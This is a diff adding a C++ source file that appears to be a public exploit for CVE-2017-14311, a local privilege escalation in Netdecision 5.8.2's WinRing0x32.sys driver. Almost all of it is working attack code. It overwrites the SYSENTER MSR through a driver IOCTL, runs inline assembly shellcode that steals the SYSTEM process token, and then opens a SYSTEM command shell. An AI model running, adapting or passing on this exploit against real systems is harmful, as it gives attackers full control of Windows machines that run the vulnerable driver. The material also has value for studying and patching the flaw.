@@ -1,0 +1,313 @@
+// Netdecision.cpp : Defines the entry point for the console application.
+/*
+# Exploit Title: Netdecision 5.8.2 - Local Privilege Escalation - Winring0x32.sys
+# Date: 2017.09.17
+# Exploit Author: Peter Baris
+# Vendor Homepage: www.netmechanica.com
+# Software Link: http://www.netmechanica.com/downloads/  //registration required
+# Version: 5.8.2 
+# Tested on: Windows 7 Pro SP1 x86 / Windows 7 Enterprise SP1
+# CVE : CVE-2017-14311 
+
+Vendor notified on 2017.09.11 - no response */
+
+#include "stdafx.h"
+#include <stdio.h>
+#include <Windows.h>
+#include <winioctl.h>
+#include <tlhelp32.h>
+#include <Psapi.h>
+
+#define DEVICE_NAME L"\\\\.\\WinRing0_1_2_0"
+
+
+
+LPCTSTR FileName = (LPCTSTR)DEVICE_NAME;
+HANDLE GetDeviceHandle(LPCTSTR FileName) {
+	HANDLE hFile = NULL;
+
+	hFile = CreateFile(FileName,
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		0,
+		OPEN_EXISTING,
+		NULL,
+		0);
+
+	return hFile;
+}
+
+
+extern ULONG ZwYieldExecution = NULL;
+extern PVOID KernelBaseAddressInKernelMode = NULL;
+extern	HMODULE hKernelInUserMode = NULL;
+
+VOID GetKiFastSystemCall() {
+
+	SIZE_T ReturnLength;
+	HMODULE hntdll = NULL;
+
+	ULONG ZwYieldExecution_offset;
+
+
+	hntdll = LoadLibraryA("ntdll.dll");
+
+	if (!hntdll) {
+		printf("[-] Failed to Load ntdll.dll: 0x%X\n", GetLastError());
+		exit(EXIT_FAILURE);
+	}
+
+	LPVOID drivers[1024];
+	DWORD cbNeeded;
+
+	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
+	KernelBaseAddressInKernelMode = drivers[0];
+
+
+	printf("[+] Kernel base address: 0x%X\n", KernelBaseAddressInKernelMode);
+	
+	hKernelInUserMode = LoadLibraryA("ntkrnlpa.exe");
+
+	if (!hKernelInUserMode) {
+		printf("[-] Failed to load kernel: 0x%X\n", GetLastError());
+		exit;
+	}
+
+
+	printf("[+] KernelImage Base in User-Mode 0x%X\r\n", hKernelInUserMode);
+
+	
+	
+
+	ZwYieldExecution = GetProcAddress(hKernelInUserMode, "ZwYieldExecution");
+	
+	if (!ZwYieldExecution) {
+		printf("[-] Failed to resolve KiFastSystemCall: 0x%X\n", GetLastError());
+		exit;
+	}
+	
+	ZwYieldExecution_offset = (ULONG)ZwYieldExecution - (ULONG)hKernelInUserMode;
+	printf("[+] ZwYieldExecution's offset address in ntkrnlpa.exe: 0x%X\n", ZwYieldExecution_offset);
+
+
+	(ULONG)ZwYieldExecution = (ULONG)ZwYieldExecution_offset + (ULONG)KernelBaseAddressInKernelMode;
+
+	printf("[+] ZwYieldExecution's address in kernel-mode: 0x%X\n", ZwYieldExecution);
+
+
+	if (hntdll) {
+		FreeLibrary(hntdll);
+	}
+
+	if (hKernelInUserMode) {
+		FreeLibrary(hKernelInUserMode);
+	}
+
+	hntdll = NULL;
+
+	return hKernelInUserMode;
+	return ZwYieldExecution;
+}
+
+
+extern ULONG eip = NULL;
+extern ULONG pesp = NULL;
+extern ULONG pebp = NULL;
+extern ULONG ETHREAD = NULL;
+
+ULONG Shellcode() {
+
+	ULONG FunctionAddress = ZwYieldExecution;
+	
+	__asm {
+
+		pushad
+		pushfd
+		xor eax,eax
+
+		mov edi, FunctionAddress  ; Address of ZwYieldExection to EDI
+
+		SearchCall:
+		mov eax, 0xe8
+		scasb
+		jnz SearchCall
+
+		mov ebx, edi
+		mov ecx, [edi]
+		add ebx, ecx; EBX points to KiSystemService
+		add ebx, 0x4
+
+		lea edi, [ebx - 0x1]
+		SearchFastCallEntry:
+		mov eax, 0x00000023
+		scasd
+		jnz SearchFastCallEntry
+		mov eax, 0xa10f306a
+		scasd
+		jnz SearchFastCallEntry
+
+		lea eax,[edi-0x9]
+		xor edx, edx
+		mov ecx, 0x176
+
+
+		wrmsr
+		popfd
+		popad
+			
+		
+		mov eax,ETHREAD
+		
+		mov eax,[eax]
+		mov eax, [eax+0x050]
+		mov ecx, eax
+		mov edx, 0x4
+		
+		FindSystemProcess :
+		mov eax, [eax + 0x0B8]
+		sub eax, 0x0B8
+		cmp[eax + 0x0B4], edx
+		jne FindSystemProcess
+
+		
+		mov edx, [eax + 0x0F8]
+		mov[ecx + 0x0F8], edx
+
+		;xor eax, eax
+		mov esp,pesp
+		mov ebp,pebp
+	
+		push eip
+	;		int 3
+		ret
+		
+	}
+	
+}
+
+
+
+int main()
+{
+	HANDLE hlib = NULL;
+	HANDLE hFile = NULL;
+	PVOID lpInBuffer = NULL;
+	ULONG lpOutBuffer = NULL;
+	ULONG lpBytesReturned;
+	PVOID BuffAddress = NULL;
+	SIZE_T BufferSize = 0x1000;
+	SIZE_T nOutBufferSize = 0x800;
+	ULONG Interval = 0;
+	ULONG Shell = &Shellcode;
+	NTSTATUS NtStatus = NULL;
+
+
+	
+	/* Undocumented feature to trigger the vulnerability */
+	hlib = LoadLibraryA("ntdll.dll");
+
+	if (!hlib) {
+		printf("[-] Failed to load the library: 0x%X\n", GetLastError());
+		exit(EXIT_FAILURE);
+	}
+	
+
+	GetKiFastSystemCall();
+	
+	/* Allocate memory for our input and output buffers */
+	lpInBuffer = VirtualAlloc(NULL, BufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	
+	/*Getting KiFastSystemCall address from ntdll.dll to restore it in 0x176 MSR*/
+	
+
+	lpOutBuffer = VirtualAlloc(NULL, BufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	//printf("[+] Address to write our shellcode's address to: 0x%X\r\n", lpOutBuffer);
+
+
+	/* Crafting the input buffer */
+
+	BuffAddress = (PVOID)(((ULONG)lpInBuffer));
+	*(PULONG)BuffAddress = (ULONG)0x00000176; /*IA32_SYSENTER_EIP MSR*/
+	BuffAddress = (PVOID)(((ULONG)lpInBuffer + 0x4));
+	*(PULONG)BuffAddress = (ULONG)Shell; /*Our assembly shellcode Pointer into EAX*/
+	BuffAddress = (PVOID)(((ULONG)lpInBuffer + 0x8));
+	*(PULONG)BuffAddress = (ULONG)0x00000000;  /* EDX is 0x00000000 in 32bit mode */
+	BuffAddress = (PVOID)(((ULONG)lpInBuffer + 0xc));
+	*(PULONG)BuffAddress = (ULONG)0x00000000;
+
+
+	//RtlFillMemory(lpInBuffer, BufferSize, 0x41);
+	//RtlFillMemory(lpOutBuffer, BufferSize, 0x42);
+
+	
+	//printf("[+] Trying the get the handle for the WinRing0_1_2_0 device.\r\n");
+
+	hFile = GetDeviceHandle(FileName);
+
+	if (hFile == INVALID_HANDLE_VALUE) {
+		printf("[-] Can't get the device handle. 0x%X\r\n", GetLastError());
+		return 1;
+	}
+	else
+	{
+		printf("[+] Handle opened for WinRing0x32. Sending IOCTL.\r\n");
+	}
+	
+	/*Here we calculate the EIP for our return from kernel-mode. This exploit does not let us simply adjust the stack and return*/
+
+	(HANDLE)eip = GetModuleHandleA(NULL); /*Getting the base address of our process*/
+	printf("[+] Current process base address 0x%X\r\n", (HANDLE)eip);
+	(HANDLE)eip = eip + 0x13ae; /*Any time you change something in the main() section you MUST adjust the offset to point to the PUSH 40 instrction*/
+	printf("[+] Return address (EIP) from kernel-mode 0x%X\r\n", (HANDLE)eip);
+
+	/*Setting CPU affinity before execution to maximize the chance of executing our code on the same CPU core*/
+	DWORD_PTR i = 1; /*CPU Core with ID 1 will be always chosen for the execution*/
+
+	ULONG affinity = SetThreadAffinityMask(GetCurrentThread(), i);
+
+	printf("[+] Setting affinity for logical CPU with ID:%d\r\n", i);
+		if (affinity == NULL) {
+
+			printf("[-] Something went wrong while setting CPU affinity 0x%X\r\n", GetLastError());
+			exit(1);
+		}
+	
+	ETHREAD = (ULONG)KernelBaseAddressInKernelMode + 0x12bd24; /*Offset to nt!KiInitialThread as TEB is not readable*/
+
+	/*Saving stack pointer and stack frame of user-mode before diving in kernel-mode to restore it before returning to user-mode */
+
+	__asm {
+		
+		mov pesp, esp
+		mov pebp, ebp
+		nop
+	}
+	
+
+	DeviceIoControl(hFile,
+		0x9C402088, 
+		lpInBuffer,
+		0x10,
+		lpOutBuffer, 
+		0x20,  
+		&lpBytesReturned,
+		NULL);
+	
+	
+
+		STARTUPINFO info = { sizeof(info) };
+		PROCESS_INFORMATION processInfo;
+		NTSTATUS proc;
+		LPCSTR command = L"C:\\Windows\\System32\\cmd.exe";
+		proc = CreateProcess(command, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo);
+
+		if (!proc) {
+	
+			printf("ERROR 0x%X\r\n", proc);
+		}
+		WaitForSingleObject(processInfo.hProcess, INFINITE);
+	
+
+	exit(0);
+}
+
